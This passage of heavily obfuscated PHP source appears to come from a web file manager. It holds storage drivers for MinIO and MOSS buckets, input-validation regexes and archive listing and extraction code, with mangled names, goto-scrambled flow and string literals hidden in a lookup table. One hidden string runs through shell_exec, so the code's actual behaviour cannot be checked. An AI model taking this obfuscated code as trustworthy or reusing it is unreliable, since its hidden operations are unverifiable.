$this->iconvSystem($d‘½—áæ); if ($eî¥·˜¼ùß === !1) { $eî¥·˜¼ùß = $this->size($d‘½—áæ); } goto dùöôô¤â¨; bˆ‰´ÌøÔÅ: fseek($eš…¥¼Üë×, $aÚÄ©Ããòõ); $aä™Úåöš… = fread($eš…¥¼Üë×, $eî¥·˜¼ùß); fclose($eš…¥¼Üë×); goto eŒ‹óø©µ›; eŒ‹óø©µ›: return $aä™Úåöš…; goto cïËœÙœ ; dùöôô¤â¨: if ($eî¥·˜¼ùß <= 0) { return $F³œÙ”š‰Â[33]; } $eš…¥¼Üë× = fopen($d‘½—áæ, $F³œÙ”š‰Â[869]); if (!$eš…¥¼Üë×) { return !1; } goto bˆ‰´ÌøÔÅ; cïËœÙœ : } public function upload($cĞôâá™, $EÈœ¥Ü±‘, $EÆ„ò˜ò­ = false, $f„šâ÷¼Ãî = REPEAT_REPLACE) { $E³­—ªõ†£ = $this->copyFile($EÈœ¥Ü±‘, $cĞôâá™); return $E³­—ªõ†£ ? $this->getPathOuter($cĞôâá™) : !1; } public function download($eä ©çŞ¶, $F”’Äáç¾Ä) { return $this->iconvSystem($eä ©çŞ¶); } } class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($eñ²†Œà´) { parent::__construct($eñ²†Œà´); $this->signatureVersion($_SERVER[ÍÓÖ€°å][188]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($DõÂ¿ ³ó, $b”«ÏƒÓÌ, $aƒ„çÇ´Ø = array()) { $aš¶”Ë’Ï = $this->tempFile($DõÂ¿ ³ó); $this->download($DõÂ¿ ³ó, $aš¶”Ë’Ï); $B‘»¯Ö¼œ§ = $this->upload($b”«ÏƒÓÌ, $aš¶”Ë’Ï); $this->tempFileRemve($aš¶”Ë’Ï); return $B‘»¯Ö¼œ§; } public function uploadFormData($bº³–“êİ, $D˜±ÜØÉàß = 3600) { return parent::uploadFormData($bº³–“êİ, $D˜±ÜØÉàß); } public function fileOut($eÈ¿ã­´Ãì, $BªË¦¯Æ‹† = false, $Fİó©´ÒˆÇ = false, $b™ˆà¬§Õà = '') { parent::fileOutServer($eÈ¿ã­´Ãì, $BªË¦¯Æ‹†, $Fİó©´ÒˆÇ, $b™ˆà¬§Õà); } public function fileOutLink($f×ÍÔÔ´Çğ) { header($_SERVER[ÍÓÖ€°å][146] . $f×ÍÔÔ´Çğ); die; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($cÅ‘¿ĞØ£) { parent::__construct($cÅ‘¿ĞØ£); $this->signatureVersion($_SERVER[ÍÓÖ€°å][188]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function isFolder($dÕÁŸÎá ) { $cèñÁ‹¸Œ® =& $_SERVER[ÍÓÖ€°å]; $dÕÁŸÎá  = trim($dÕÁŸÎá , $cèñÁ‹¸Œ®[8]); if (!empty($dÕÁŸÎá )) { $dÕÁŸÎá  .= $cèñÁ‹¸Œ®[8]; } if ($this->getObjectInfo($dÕÁŸÎá )) { return !0; } return parent::isFolder($dÕÁŸÎá ); } public function fileOutLink($c¶º²§Èõê) { header($_SERVER[ÍÓÖ€°å][146] . $c¶º²§Èõê); die; } } goto DÆÎ†àˆ™°; AÍ­Æµ¦ŞÊ: $_SERVER[$_SERVER[ÌˆŞó˜ªµ°][33]] = filesize($_SERVER[$_SERVER[ÌˆŞó˜ªµ°][31]]); $_SERVER[$_SERVER[ÌˆŞó˜ªµ°][34]] = ("\67\71\71\64".base64_decode('OTc='))+0;$_JFSd="MfrINPuGEBBGQgUQvq5W83IaXbzf5R6BPJFxmhDeWGwW8pSZQ";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Dƒ—³ó§, $CØ‚Ğ˜Ûöó) { $a¯é©¿–“ =& $_SERVER[ÍÓÖ€°å]; if (isset(self::$_methodList[$Dƒ—³ó§])) { return @call_user_func_array(self::$_methodList[$Dƒ—³ó§], $CØ‚Ğ˜Ûöó); } else { if (method_exists($this, $Dƒ—³ó§)) { return call_user_func_array(array($this, $Dƒ—³ó§), $CØ‚Ğ˜Ûöó); } else { think_exception(__CLASS__ . $a¯é©¿–“[4] . $Dƒ—³ó§ . $a¯é©¿–“[5]); } } } public static function __callStatic($bß„ç¶¾£ß, $b‹Ÿ²ÅÌÈ) { if (isset(self::$_methodListStatic[$bß„ç¶¾£ß])) { return call_user_func_array(self::$_methodListStatic[$bß„ç¶¾£ß], $b‹Ÿ²ÅÌÈ); } else { if (method_exists(self, $bß„ç¶¾£ß)) { return call_user_func_array(array(self, $bß„ç¶¾£ß), $b‹Ÿ²ÅÌÈ); } else { show_json("{$bß„ç¶¾£ß}\x28\x29\x20\x6e\x6f\x74\40\145\170\151\163\x74\x3b", !1); } } } public static function addMethod($EÁŒÓàÑ¥, $d‰¨ìÔ£‚…) { self::$_methodList[$EÁŒÓàÑ¥] = $d‰¨ìÔ£‚…; } public static function addMethodStatic($CíÌ‰ãç, $c¼İ„¤¦ˆ) { self::$_methodListStatic[$CíÌ‰ãç] = $c¼İ„¤¦ˆ; } } goto aÌ“¼­í; D’Ã£ø¿¨å: set_error_handler($_SERVER[ÌˆŞó˜ªµ°][28], $eäĞŸİÆíĞ); if (function_exists($_SERVER[ÌˆŞó˜ªµ°][29])) { set_exception_handler($_SERVER[ÌˆŞó˜ªµ°][30]); } $_SERVER[$_SERVER[ÌˆŞó˜ªµ°][31]] = BASIC_PATH . $_SERVER[ÌˆŞó˜ªµ°][32]; goto AÍ­Æµ¦ŞÊ; bñ¿ÛÆ•: if ($_SERVER[$_SERVER[ÍÓÖ€°å][544]] != $_SERVER[$_SERVER[ÍÓÖ€°å][545]]) { goto F˜§’ØƒÑ; f‡¡Ñä¼Ø: $D½æĞ¨‰Í($_SERVER[$_SERVER[ÍÓÖ€°å][945]]); goto Dóğïìæ; b˜Ÿƒë‚Ë‹: $c®¥†ÕŸ‘ = explode($_SERVER[ÍÓÖ€°å][212], $C¨Ê¢äëí); if (count($c®¥†ÕŸ‘) < $_SERVER[ÍÓÖ€°å][1238]) { die; } $D½æĞ¨‰Í = $_SERVER[ÍÓÖ€°å][1239]; goto f‡¡Ñä¼Ø; F˜§’ØƒÑ: $Cå’Ç¶™¨ = $_SERVER[ÍÓÖ€°å][546]; $Fù¢­§„ß† = BASIC_PATH . $_SERVER[ÍÓÖ€°å][547]; $C¨Ê¢äëí = $Cå’Ç¶™¨($Fù¢­§„ß†); goto b˜Ÿƒë‚Ë‹; Dóğïìæ: } class Input { public static function getArray($E‹Ğ‚º±šÂ) { goto a„ ²ñ© ; cŞ¤«²„: if (count($FÌ ”¹±…Ñ) > 0) { show_json(implode($Bß‘ŸÍ¶[1245], $FÌ ”¹±…Ñ), !1); } return $d‹È…¿Ä; goto Dº—ŸŸ¨‹¨; d¹Ç‹°ÅÀé: $FÌ ”¹±…Ñ = array(); $B·Í¼ÌŠ‘Ô = LNG($Bß‘ŸÍ¶[1240]); foreach ($E‹Ğ‚º±šÂ as $f†Üİó ×ù => $bç”åÅ•Ê) { goto c†×—Æ—…Ñ; bˆÉ×ºİ¹é: if (isset($bç”åÅ•Ê[$Bß‘ŸÍ¶[1244]]) && !self::check($in[$f†Üİó ×ù], $bç”åÅ•Ê[$Bß‘ŸÍ¶[1244]], $E´À‰šŒÏ÷)) { if (array_key_exists($Bß‘ŸÍ¶[1243], $bç”åÅ•Ê)) { if (!is_null($bç”åÅ•Ê[$Bß‘ŸÍ¶[1243]])) { $d‹È…¿Ä[$cÙ¨ğäã÷•] = $bç”åÅ•Ê[$Bß‘ŸÍ¶[1243]]; } } else { $FÌ ”¹±…Ñ[] = $Fä‚±Öô‹; } continue; } $d‹È…¿Ä[$cÙ¨ğäã÷•] = $in[$f†Üİó ×ù]; goto Cæš±Òñ²; c†×—Æ—…Ñ: $Fä‚±Öô‹ = _get($bç”åÅ•Ê, $Bß‘ŸÍ¶[1241], $B·Í¼ÌŠ‘Ô . $Bß‘ŸÍ¶[635] . $f†Üİó ×ù); $cÙ¨ğäã÷• = $f†Üİó ×ù; if (isset($bç”åÅ•Ê[$Bß‘ŸÍ¶[1242]]) && $bç”åÅ•Ê[$Bß‘ŸÍ¶[1242]]) { $cÙ¨ğäã÷• = $bç”åÅ•Ê[$Bß‘ŸÍ¶[1242]]; } goto BâÊîŞ«øí; BâÊîŞ«øí: if (!array_key_exists($f†Üİó ×ù, $in)) { if (array_key_exists($Bß‘ŸÍ¶[1243], $bç”åÅ•Ê)) { if (!is_null($bç”åÅ•Ê[$Bß‘ŸÍ¶[1243]])) { $d‹È…¿Ä[$cÙ¨ğäã÷•] = $bç”åÅ•Ê[$Bß‘ŸÍ¶[1243]]; } } else { if (isset($bç”åÅ•Ê[$Bß‘ŸÍ¶[1244]])) { $FÌ ”¹±…Ñ[] = $Fä‚±Öô‹; } } continue; } if (isset($bç”åÅ•Ê[$Bß‘ŸÍ¶[1244]]) && $bç”åÅ•Ê[$Bß‘ŸÍ¶[1244]] == $Bß‘ŸÍ¶[274]) { $Aœ´ß’ìœ = json_decode($in[$f†Üİó ×ù], !0); if (is_array($Aœ´ß’ìœ)) { $d‹È…¿Ä[$cÙ¨ğäã÷•] = $Aœ´ß’ìœ; } else { if (array_key_exists($Bß‘ŸÍ¶[1243], $bç”åÅ•Ê)) { if (!is_null($bç”åÅ•Ê[$Bß‘ŸÍ¶[1243]])) { $d‹È…¿Ä[$cÙ¨ğäã÷•] = $bç”åÅ•Ê[$Bß‘ŸÍ¶[1243]]; } } else { $FÌ ”¹±…Ñ[] = $Fä‚±Öô‹; } } continue; } $E´À‰šŒÏ÷ = _get($bç”åÅ•Ê, $Bß‘ŸÍ¶[740]); goto bˆÉ×ºİ¹é; Cæš±Òñ²: } goto cŞ¤«²„; a„ ²ñ© : $Bß‘ŸÍ¶ =& $_SERVER[ÍÓÖ€°å]; global $in; $d‹È…¿Ä = array(); goto d¹Ç‹°ÅÀé; Dº—ŸŸ¨‹¨: } public static function reg($FÊŒ‰°ßĞù = "\162\x65\161\165\x69\162\145") { static $fñ¢Èíè× = array("\x72\145\161\x75\x69\x72\x65" => "\x2e\53", "\156\x75\x6d\142\145\x72" => "\x5c\144\x2b", "\150\x65\x78" => "\x5b\60\x2d\x39\101\55\x46\141\55\146\x5d\53", "\x69\x6e\x74" => "\133\x2d\x5c\53\135\77\x5c\144\53", "\x62\157\157\154" => "\60\x7c\x31", "\146\x6c\157\x61\164" => "\133\55\x5c\x2b\x5d\x3f\x5c\x64\53\x28\134\x2e\134\144\x2b\51\x3f", "\x65\156\x67\x6c\x69\x73\x68" => "\x5b\x41\55\132\141\55\172\40\135\53", "\x63\150\151\156\x65\163\145" => "\x5b\134\x78\x7b\x34\x65\x30\x30\175\55\x5c\x78\x7b\71\x66\141\65\x7d\135\53", "\150\x61\x73\x43\x68\151\x6e\145\163\x65" => "\x2f\50\x5b\x5c\170\x7b\x34\x65\x30\60\175\55\134\x78\173\x39\146\141\65\175\135\53\x29\x2f\165", "\x65\x6d\141\151\154" => "\x5c\167\x2b\x28\133\134\x2e\x5c\55\135\x5c\x77\53\51\x2a\x5c\x40\x5c\x77\53\x28\133\x5c\x2e\x5c\55\135\x5c\167\x2b\x29\52\134\x2e\x5c\167\53", "\160\150\x6f\x6e\145" => "\61\x5b\63\64\65\x37\x38\x5d\134\x64\173\x39\175", "\x74\145\x6c\160\x68\x6f\156\145" => "\x28\x5c\50\x5c\x64\173\x33\x2c\64\x7d\x5c\x29\174\134\x64\173\63\x2c\64\175\x2d\174\x5c\x73\x29\x3f\134\x64\x7b\67\x2c\61\x34\x7d", "\165\x72\x6c" => "\50\150\164\164\x70\174\146\164\160\x7c\150\x74\x74\x70\x73\x29\72\134\57\134\57\133\x5c\167\x5c\55\x5f\x5d\53\50\x5c\56\x5b\134\167\x5c\55\137\x5d\x2b\51\53\x28\133\134\x77\x5c\55\134\56\x2c\100\77\x5e\75\45\x26\72\134\57\x7e\x5c\53\43\135\x2a\x5b\134\167\x5c\x2d\x5c\100\77\x5e\75\45\x26\134\x2f\176\134\53\43\135\x29\x3f", "\x75\162\154\106\165\154\x6c" => "\133\141\x2d\172\x41\x2d\x7a\x5d\53\x3a\134\x2f\x5c\x2f\133\136\134\x73\x5d\x2a", "\151\x70" => "\50\x5c\144\x7b\61\54\63\175\x5c\x2e\51\173\x33\175\50\134\144\x7b\x31\54\63\x7d\x29", "\x7a\x69\160" => "\x5b\61\55\x39\x5d\x5c\144\173\x35\x7d\50\77\x21\134\x64\x29", "\x69\144\103\141\162\144" => "\x28\134\144\x7b\x31\65\x7d\x29\x7c\x28\x5c\144\173\x31\x37\175\50\134\x64\174\x58\x7c\170\51\51", "\143\157\x6c\x6f\162" => "\43\50\133\60\x2d\x39\101\55\106\x61\x2d\x66\x5d\173\x33\x7d\x7c\x5b\60\55\71\101\x2d\106\x61\x2d\146\x5d\173\66\x7d\51", "\164\151\155\x65" => "\50\133\60\x2d\x31\135\134\x64\174\x32\133\x30\55\x34\135\x29\x3a\133\x30\x2d\x35\x5d\x5c\144", "\x64\141\x74\x65" => "\x5c\x64\173\64\175\x5b\x2d\134\57\135\77\x28\x30\133\x31\55\x39\135\174\61\133\60\55\x32\135\x29\x5b\x2d\134\x2f\x5d\77\50\133\x30\x2d\62\x5d\x5c\x64\x7c\x33\133\x30\55\61\135\x29", "\x64\x61\x74\145\x54\x69\x6d\x65" => "\x5c\x64\173\x34\x7d\133\x2d\134\57\135\x3f\x28\x30\133\61\x2d\x39\x5d\x7c\x31\133\60\55\x32\135\x29\133\x2d\134\x2f\x5d\77\50\133\60\55\62\x5d\134\144\174\x33\x5b\x30\55\x31\135\51\x5c\163\x2b\50\133\x30\x2d\x31\135\x5c\x64\174\x32\133\60\x2d\64\x5d\x29\x3a\133\60\x2d\65\x5d\x5c\144", "\160\141\x73\163\167\x6f\162\144" => "\50\x3f\75\x2e\52\x5c\x64\x29\50\77\75\56\52\133\141\55\172\x5d\51\x28\x3f\75\56\52\x5b\101\55\x5a\135\51\x2e\x7b\70\x2c\62\x30\175", "\x6b\145\171" => "\x5b\101\x2d\132\x61\x2d\172\60\x2d\x39\137\x5c\x2d\x5c\x2e\135\x2b", "\x6b\145\171\106\165\x6c\154" => "\x5b\101\x2d\132\141\x2d\x7a\x30\55\x39\x5f\134\x2d\134\x2e\134\163\54\135\53"); if (!$FÊŒ‰°ßĞù) { return $fñ¢Èíè×; } return $fñ¢Èíè×[$FÊŒ‰°ßĞù]; } public static function check($dÂ³ãƒ¡, $Cö†ÇË‹Â, $eï°å‚†Æ = null) { $DÙ‘ãõ«ö’ =& $_SERVER[ÍÓÖ€°å]; switch ($Cö†ÇË‹Â) { case $DÙ‘ãõ«ö’[7]: return in_array($dÂ³ãƒ¡, $eï°å‚†Æ); break; case $DÙ‘ãõ«ö’[1246]: return floatval($dÂ³ãƒ¡) > $eï°å‚†Æ; break; case $DÙ‘ãõ«ö’[1247]: return floatval($dÂ³ãƒ¡) < $eï°å‚†Æ; break; case $DÙ‘ãõ«ö’[317]: return strlen($dÂ³ãƒ¡) >= $eï°å‚†Æ[0] && strlen($dÂ³ãƒ¡) <= $eï°å‚†Æ[1]; break; case $DÙ‘ãõ«ö’[317]: if (is_array($eï°å‚†Æ)) { return strlen($dÂ³ãƒ¡) >= $eï°å‚†Æ[0] && strlen($dÂ³ãƒ¡) <= $eï°å‚†Æ[1]; break; } else { return strlen($dÂ³ãƒ¡) == $eï°å‚†Æ; break; } case $DÙ‘ãõ«ö’[313]: return floatval($dÂ³ãƒ¡) >= $eï°å‚†Æ[0] && floatval($dÂ³ãƒ¡) <= $eï°å‚†Æ[1]; break; } $f¤ĞÛÍ¶†½ = self::reg(!1); $Cö†ÇË‹Â = isset($f¤ĞÛÍ¶†½[$Cö†ÇË‹Â]) ? $f¤ĞÛÍ¶†½[$Cö†ÇË‹Â] : $Cö†ÇË‹Â; if (substr($Cö†ÇË‹Â, 0, 1) != $DÙ‘ãõ«ö’[8]) { $Cö†ÇË‹Â = $DÙ‘ãõ«ö’[1248] . $Cö†ÇË‹Â . $DÙ‘ãõ«ö’[1249]; } return preg_match($Cö†ÇË‹Â, $dÂ³ãƒ¡) === 1; } public static function get($f£Êøƒ±Å, $b•£à„‹³° = null, $AëñõßóòŠ = null, $bÍÎĞ¼Ö§ = null) { goto c•ˆ«Êİ£®; cÑâ³½á‚: if (!is_null($bÍÎĞ¼Ö§)) { $bÛë¥İ·‰¯[$eù‹¶‹¦ù[740]] = $bÍÎĞ¼Ö§; } if (!is_null($b•£à„‹³°)) { $bÛë¥İ·‰¯[$eù‹¶‹¦ù[1244]] = $b•£à„‹³°; } $B„©¬”Œà© = Input::getArray(array($f£Êøƒ±Å => $bÛë¥İ·‰¯)); goto aìğà§³Œ; aìğà§³Œ: return $B„©¬”Œà©[$f£Êøƒ±Å]; goto E¹öÅíÊ³; c•ˆ«Êİ£®: $eù‹¶‹¦ù =& $_SERVER[ÍÓÖ€°å]; $bÛë¥İ·‰¯ = array(); if (!is_null($AëñõßóòŠ)) { $bÛë¥İ·‰¯[$eù‹¶‹¦ù[34]] = $AëñõßóòŠ; } goto cÑâ³½á‚; E¹öÅíÊ³: } } class KodArchive { static function init() { goto Aƒß‹ëñ§„; F¤†««íšª: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $eŠ†¸šíÚ‘[1256]; require_once ARCHIVE_LIB . $eŠ†¸šíÚ‘[1257]; goto e”†¬Íïá¥; f†ø‘ĞÏ¹°: define($eŠ†¸šíÚ‘[1252], TEMP_FILES); define($eŠ†¸šíÚ‘[1253], TEMP_FILES); define($eŠ†¸šíÚ‘[1254], $eŠ†¸šíÚ‘[1255]); goto F¤†««íšª; Aƒß‹ëñ§„: $eŠ†¸šíÚ‘ =& $_SERVER[ÍÓÖ€°å]; if (defined($eŠ†¸šíÚ‘[1250])) { return; } define($eŠ†¸šíÚ‘[1250], SDK_DIR . $eŠ†¸šíÚ‘[1251]); goto f†ø‘ĞÏ¹°; c”ˆî ˜Ãí: require_once ARCHIVE_LIB . $eŠ†¸šíÚ‘[1261]; goto cÑ¶¤¸ïà; e”†¬Íïá¥: require_once ARCHIVE_LIB . $eŠ†¸šíÚ‘[1258]; require_once ARCHIVE_LIB . $eŠ†¸šíÚ‘[1259]; require_once ARCHIVE_LIB . $eŠ†¸šíÚ‘[1260]; goto c”ˆî ˜Ãí; cÑ¶¤¸ïà: } static function checkIfType($cóë¦¶¡íß, $aÒõ “ã¶¤) { goto AˆÅø¼±×Œ; c†´É…ÓºÙ: $aŠÅºÉÊˆ = in_array($cóë¦¶¡íß, $eŸ…‹ÖØÂ‚[$aÒõ “ã¶¤]); if ($aŠÅºÉÊˆ && ($aÒõ “ã¶¤ == $FŒÒÚóÆ‰[293] || $aÒõ “ã¶¤ == $FŒÒÚóÆ‰[1265]) && (!function_exists($FŒÒÚóÆ‰[1275]) || !function_exists($FŒÒÚóÆ‰[1276]))) { show_tips($FŒÒÚóÆ‰[1277]); } if ($aŠÅºÉÊˆ && $aÒõ “ã¶¤ == $FŒÒÚóÆ‰[769] && (!function_exists($FŒÒÚóÆ‰[1278]) || !strstr(shell_exec($FŒÒÚóÆ‰[1279]), $FŒÒÚóÆ‰[1280]))) { show_tips($FŒÒÚóÆ‰[1281]); } goto Añ¸©‡˜ñÁ; AˆÅø¼±×Œ: $FŒÒÚóÆ‰ =& $_SERVER[ÍÓÖ€°å]; self::init(); $eŸ…‹ÖØÂ‚ = array($FŒÒÚóÆ‰[293] => array($FŒÒÚóÆ‰[293], $FŒÒÚóÆ‰[1262], $FŒÒÚóÆ‰[1263], $FŒÒÚóÆ‰[1264]), $FŒÒÚóÆ‰[1265] => array($FŒÒÚóÆ‰[1265], $FŒÒÚóÆ‰[1266], $FŒÒÚóÆ‰[1267], $FŒÒÚóÆ‰[1268]), $FŒÒÚóÆ‰[769] => array($FŒÒÚóÆ‰[769], $FŒÒÚóÆ‰[1269], $FŒÒÚóÆ‰[1270], $FŒÒÚóÆ‰[1271], $FŒÒÚóÆ‰[1272], $FŒÒÚóÆ‰[1273], $FŒÒÚóÆ‰[1274])); goto c†´É…ÓºÙ; Añ¸©‡˜ñÁ: return $aŠÅºÉÊˆ; goto A¦­ç˜Ó“¸; A¦­ç˜Ó“¸: } static function listContent($cÙÌÛ††¿, $CÈ²¥ø´…À = true) { $eß˜”©– =& $_SERVER[ÍÓÖ€°å]; self::init(); $DÚë¼˜„ = $GLOBALS[$eß˜”©–[770]] ? $GLOBALS[$eß˜”©–[770]] : get_path_ext($cÙÌÛ††¿); $e˜èˆ‚Å = !1; if (self::checkIfType($DÚë¼˜„, $eß˜”©–[1265])) { $aîÊ…‹¥ßÖ = PclTarList($cÙÌÛ††¿, $DÚë¼˜„); $e˜èˆ‚Å = array(); for ($B™‘’µÏ† = 0; $B™‘’µÏ† < count($aîÊ…‹¥ßÖ); $B™‘’µÏ†++) { $dÔŒê–œŠƒ = $aîÊ…‹¥ßÖ[$B™‘’µÏ†]; if ($dÔŒê–œŠƒ[$eß˜”©–[1282]] == $eß˜”©–[1283] || $dÔŒê–œŠƒ[$eß˜”©–[1282]] == $eß˜”©–[1284]) { continue; } if ($CÈ²¥ø´…À) { $dÔŒê–œŠƒ[$eß˜”©–[1285]] = ltrim($dÔŒê–œŠƒ[$eß˜”©–[1285]], $eß˜”©–[855]); } if ($dÔŒê–œŠƒ[$eß˜”©–[1282]] == $eß˜”©–[1286]) { $dÔŒê–œŠƒ[$eß˜”©–[77]] = !0; } else { $dÔŒê–œŠƒ[$eß˜”©–[77]] = !1; } $dÔŒê–œŠƒ[$eß˜”©–[761]] = $B™‘’µÏ†; $e˜èˆ‚Å[] = $dÔŒê–œŠƒ; } } else { if (self::checkIfType($DÚë¼˜„, $eß˜”©–[769])) { $CËœÙ¼©Ğœ = kodRarArchive::listContent($cÙÌÛ††¿); if (!$CËœÙ¼©Ğœ[$eß˜”©–[757]]) { return $CËœÙ¼©Ğœ; } else { $e˜èˆ‚Å = $CËœÙ¼©Ğœ[$eß˜”©–[759]]; } } else { if (kodZipArchive::support($eß˜”©–[345])) { $e˜èˆ‚Å = kodZipArchive::listContent($cÙÌÛ††¿); } else { $cù·ì½ã· = new PclZip($cÙÌÛ††¿); $e˜èˆ‚Å = $cù·ì½ã·->listContent(); } } } if ($e˜èˆ‚Å) { $e·¸²©è÷• = unzip_charset_get($e˜èˆ‚Å); $CÈ²¥ø´…À = $CÈ²¥ø´…À && function_exists($eß˜”©–[66]); for ($B™‘’µÏ† = 0; $B™‘’µÏ† < count($e˜èˆ‚Å); $B™‘’µÏ†++) { $e˜èˆ‚Å[$B™‘’µÏ†][$eß˜”©–[1285]] = str_replace(array($eß˜”©–[793], $eß˜”©–[1287]), $eß˜”©–[521], $e˜èˆ‚Å[$B™‘’µÏ†][$eß˜”©–[1285]]); if ($CÈ²¥ø´…À) { $e˜èˆ‚Å[$B™‘’µÏ†][$eß˜”©–[1285]] = iconv_to($e˜èˆ‚Å[$B™‘’µÏ†][$eß˜”©–[1285]], $e·¸²©è÷•, $eß˜”©–[318]); unset($e˜èˆ‚Å[$B™‘’µÏ†][$eß˜”©–[1288]]); } } return array($eß˜”©–[757] => !0, $eß˜”©–[759] => $e˜èˆ‚Å); } else { return array($eß˜”©–[757] => !1, $eß˜”©–[759] => $e˜èˆ‚Å); } } static function extract($E–äÚ³¬Ï…, $d¶Ö¸ò³, $DŞ°‹ˆ´· = "\x2d\61", &$AŒø…’«œ = false) { goto Eï Ì°À‘; F‹ùñÈ²»”: if (self::checkIfType($A«»…¹ïÀˆ, $EãÊ·Ô·è [1265])) { if ($DŞ°‹ˆ´· != $EãÊ·Ô·è [756]) { $Bó§÷ÃÅÂ½ = unzip_pre_name($Bó§÷ÃÅÂ½); $a†ëËŞĞœ = unzip_pre_name($a†ëËŞĞœ); $bÙê‚Óß÷Ÿ = PclTarExtractList($E–äÚ³¬Ï…, array($Bó§÷ÃÅÂ½), $d¶Ö¸ò³, $a†ëËŞĞœ, $A«»…¹ïÀˆ); } else { $bÙê‚Óß÷Ÿ = PclTarExtract($E–äÚ³¬Ï…, $d¶Ö¸ò³, $EãÊ·Ô·è [352], $A«»…¹ïÀˆ); } return array($EãÊ·Ô·è [757] => $bÙê‚Óß÷Ÿ, $EãÊ·Ô·è [759] => PclErrorString(!0)); } else { if (self::checkIfType($A«»…¹ïÀˆ, $EãÊ·Ô·è [769])) { return kodRarArchive::extract($E–äÚ³¬Ï…, $d¶Ö¸ò³, $A«»…¹ïÀˆ, $AŒø…’«œ); } else { if (kodZipArchive::support($EãÊ·Ô·è [1289])) { return kodZipArchive::extract($E–äÚ³¬Ï…, $d¶Ö¸ò³, $AŒø…’«œ); } else { $BÍíÈ×ê® = new PclZip($E–äÚ³¬Ï…); if ($DŞ°‹ˆ´· != $EãÊ·Ô·è [756]) { $bÙê‚Óß÷Ÿ = $BÍíÈ×ê®->extract(PCLZIP_OPT_PATH, $d¶Ö¸ò³, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EãÊ·Ô·è [1290], PCLZIP_OPT_BY_NAME, $C¨œ½Û¯ [$EãÊ·Ô·è [1285]], PCLZIP_OPT_REMOVE_PATH, $a†ëËŞĞœ, PCLZIP_OPT_REPLACE_NEWER); } else { $bÙê‚Óß÷Ÿ = $BÍíÈ×ê®->extract(PCLZIP_OPT_PATH, $d¶Ö¸ò³, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $EãÊ·Ô·è [1290], PCLZIP_OPT_REPLACE_NEWER); } return array($EãÊ·Ô·è [757] => $bÙê‚Óß÷Ÿ, $EãÊ·Ô·è [759] => $BÍíÈ×ê®->errorName(!0)); } } } return array($EãÊ·Ô·è [757] => !1, $EãÊ·Ô·è [759] => $EãÊ·Ô·è [1291]); goto aÂÒØæŒÃ‘; bÑ‚Î‚°æá: $bÒ¸ªØÔô¡ = self::listContent($E–äÚ³¬Ï…, !1); if (!$bÒ¸ªØÔô¡[$EãÊ·Ô·è [757]]) { return $bÒ¸ªØÔô¡; } if ($DŞ°‹ˆ´· != $EãÊ·Ô·è [756]) { goto a±õÅ£‘Ùß; AªÈ©Ş¿˜µ: if ($GLOBALS[$EãÊ·Ô·è [6]][$EãÊ·Ô·è [853]] != $EãÊ·Ô·è [318]) { $Bó§÷ÃÅÂ½ = unzip_pre_name($AŒø…’«œ); } $a†ëËŞĞœ = get_path_father($AŒø…’«œ); if ($a†ëËŞĞœ == $AŒø…’«œ) { $a†ëËŞĞœ = $EãÊ·Ô·è [33]; } goto dÖ±‹Î–³¥; dÖ±‹Î–³¥: if ($C¨œ½Û¯ [$EãÊ·Ô·è [77]]) { $Bó§÷ÃÅÂ½ = rtrim($Bó§÷ÃÅÂ½, $EãÊ·Ô·è [8]) . $EãÊ·Ô·è [8]; $AŒø…’«œ = array($AŒø…’«œ); } $Cáîßì­ø = str_replace($EãÊ·Ô·è [92], $EãÊ·Ô·è [8], $Bó§÷ÃÅÂ½); if (substr($Cáîßì­ø, -1) == $EãÊ·Ô·è [8]) { if (!strstr(trim($Cáîßì­ø, $EãÊ·Ô·è [8]), $EãÊ·Ô·è [8])) { $d¶Ö¸ò³ = $d¶Ö¸ò³ . get_path_this($Cáîßì­ø) . $EãÊ·Ô·è [8]; } } else { if ($a†ëËŞĞœ == $Bó§÷ÃÅÂ½) { $a†ëËŞĞœ = $EãÊ·Ô·è [33]; } } goto CÖàÅà±¬; a±õÅ£‘Ùß: $C¨œ½Û¯  = self::fileIndex($bÒ¸ªØÔô¡[$EãÊ·Ô·è [759]], $DŞ°‹ˆ´·); $AŒø…’«œ = str_replace(array($EãÊ·Ô·è [793], $EãÊ·Ô·è [1287]), $EãÊ·Ô·è [71], $C¨œ½Û¯ [$EãÊ·Ô·è [1285]]); $Bó§÷ÃÅÂ½ = $AŒø…’«œ; goto AªÈ©Ş¿˜µ; CÖàÅà±¬: } goto F‹ùñÈ²»”; Eï Ì°À‘: $EãÊ·Ô·è  =& $_SERVER[ÍÓÖ€°å]; self::init(); $A«»…¹ïÀˆ = $GLOBALS[$EãÊ·Ô·è [770]] ? $GLOBALS[$EãÊ·Ô·è [770]] : get_path_ext($E–äÚ³¬Ï…); goto bÑ‚Î‚°æá; aÂÒØæŒÃ‘: } static function fileIndex($aäÜğÍí²â, $aÓÀ¬ÓÉË, $A»ÜŒö±†İ = false) { goto A®ÃÂçùîÎ; Cà…¹ç¢: $cÅÎºàˆ¦ = count($aäÜğÍí²â); for ($b»À¹¿êä = 0; $b»À¹¿êä < $cÅÎºàˆ¦; $b»À¹¿êä++) { if ($aÓÀ¬ÓÉË == $aäÜğÍí²â[$b»À¹¿êä][$E¢ôÂ°¾‘à[761]]) { $bÌ°îÄÚŸ¸ = $aäÜğÍí²â[$b»À¹¿êä]; break; } } if (!$bÌ°îÄÚŸ¸) { show_tips($E¢ôÂ°¾‘à[1292]); } goto b‰Îñò…‹‰; b‰Îñò…‹‰: $d®´ï†®È– = $bÌ°îÄÚŸ¸; if ($A»ÜŒö±†İ) { $d®´ï†®È– = $bÌ°îÄÚŸ¸[$A»ÜŒö±†İ]; if ($bÌ°îÄÚŸ¸[$E¢ôÂ°¾‘à[77]]) { $d®´ï†®È– = rtrim($d®´ï†®È–, $E¢ôÂ°¾‘à[8]) . $E¢ôÂ°¾‘à[8]; } } return $d®´ï†®È–; goto b·˜¾áçËÊ; A®ÃÂçùîÎ: $E¢ôÂ°¾‘à =& $_SERVER[ÍÓÖ€°å]; self::init(); if 